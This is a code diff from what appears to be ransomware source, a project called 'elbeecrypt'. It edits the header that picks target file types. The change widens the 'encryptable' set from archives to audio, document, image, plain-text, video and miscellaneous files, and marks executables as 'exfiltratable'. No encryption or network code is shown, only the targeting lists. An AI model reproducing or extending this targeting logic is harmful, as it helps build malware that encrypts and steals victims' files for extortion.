@@ -4,9 +4,16 @@
 #include <string>
 #include <vector>
 #include "elbeecrypt/common/utils/container.hpp"
+
 //Extension group imports
 #include "elbeecrypt/common/targets/extgroup/archive.hpp"
+#include "elbeecrypt/common/targets/extgroup/audio.hpp"
+#include "elbeecrypt/common/targets/extgroup/document.hpp"
 #include "elbeecrypt/common/targets/extgroup/executable.hpp"
+#include "elbeecrypt/common/targets/extgroup/image.hpp"
+#include "elbeecrypt/common/targets/extgroup/misc.hpp"
+#include "elbeecrypt/common/targets/extgroup/plain.hpp"
+#include "elbeecrypt/common/targets/extgroup/video.hpp"
 
 /**
  * @brief Contains groups of extensions based on a "tag" system
@@ -35,7 +42,15 @@ namespace elbeecrypt::common::targets::Extensions {
 	 * separate files according to their category in the sub-
 	 * directory `extgroup`.
 	 */
-	const std::vector<std::string> encryptable = utils::Container::concatVectors({extgroup::Archive::valuesStr()});
+	const std::vector<std::string> encryptable = utils::Container::concatVectors({
+		extgroup::Archive::values,
+		extgroup::Audio::values,
+		extgroup::Document::values,
+		extgroup::Image::values,
+		extgroup::Misc::values,
+		extgroup::Plain::values,
+		extgroup::Video::values
+	});
 
 	/**
 	 * @brief A list of extensions that map to file types that
@@ -46,7 +61,7 @@ namespace elbeecrypt::common::targets::Extensions {
 	 * be consulted. Otherwise, it is to be treated the same as
 	 * any other encryptable file.
 	 */
-	const std::vector<std::string> exfiltratable = extgroup::Executable::valuesStr();
+	const std::vector<std::string> exfiltratable = extgroup::Executable::values;
 
 	/**
 	 * @brief A list of the extensions that should be ignored by
